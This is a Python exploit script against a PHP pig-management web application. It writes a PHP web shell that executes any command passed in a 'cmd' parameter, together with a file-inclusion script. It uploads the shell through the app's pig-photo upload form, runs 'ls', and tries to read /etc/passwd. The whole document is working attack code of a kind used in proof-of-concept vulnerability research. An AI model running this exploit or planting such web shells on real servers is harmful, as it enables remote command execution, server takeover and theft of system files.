import requests

def create_php_file():
    php_code = """<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
} else {
    echo "No command provided.";
}
?>"""
    with open("command.php", "w") as file:
        file.write(php_code)

def create_lfi_php_file():
    lfi_php_code = """<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    if (file_exists($file)) {
        include($file);
    } else {
        echo "File does not exist.";
    }
} else {
    echo "No file specified.";
}
?>"""
    with open("lfi.php", "w") as file:
        file.write(lfi_php_code)

def upload_file(url, data, files):
    response = requests.post(url, data=data, files=files)
    return response

def execute_command(command_url, command):
    response = requests.get(f"{command_url}?cmd={command}")
    return response

def test_lfi(lfi_url, file_path):
    response = requests.get(f"{lfi_url}?file={file_path}")
    return response

def main():
    create_php_file()
    create_lfi_php_file()

    upload_url = "http://localhost/pig/add-pig.php"
    data = {
        'submit': 'Upload',
        'pigno': '1234',
        'weight': '150',
        'arrived': '2024-07-04',
        'breed': 'Duroc',
        'remark': 'Healthy',
        'status': 'Good',
        'gender': 'Male'
    }
    files = {
        'pigphoto': ('command.php', open('command.php', 'rb'), 'application/x-php')
    }
    
    upload_response = upload_file(upload_url, data, files)

    if upload_response.status_code == 200:
        print("File uploaded successfully.")
        
        command_url = "http://localhost/pig/uploadfolder/command.php"
        command = "ls"
        command_response = execute_command(command_url, command)
        if command_response.status_code == 200:
            print("Command executed successfully.")
            print("Response:")
            print(command_response.text)
        else:
            print(f"Failed to execute command. Status code: {command_response.status_code}")
        
        lfi_url = "http://localhost/pig/uploadfolder/lfi.php"
        lfi_file_path = "/etc/passwd"
        lfi_response = test_lfi(lfi_url, lfi_file_path)
        if lfi_response.status_code == 200:
            print("LFI test executed successfully.")
            print("Response:")
            print(lfi_response.text)
        else:
            print(f"Failed to test LFI. Status code: {lfi_response.status_code}")
    else:
        print(f"Failed to upload file. Status code: {upload_response.status_code}")

if __name__ == "__main__":
    main()
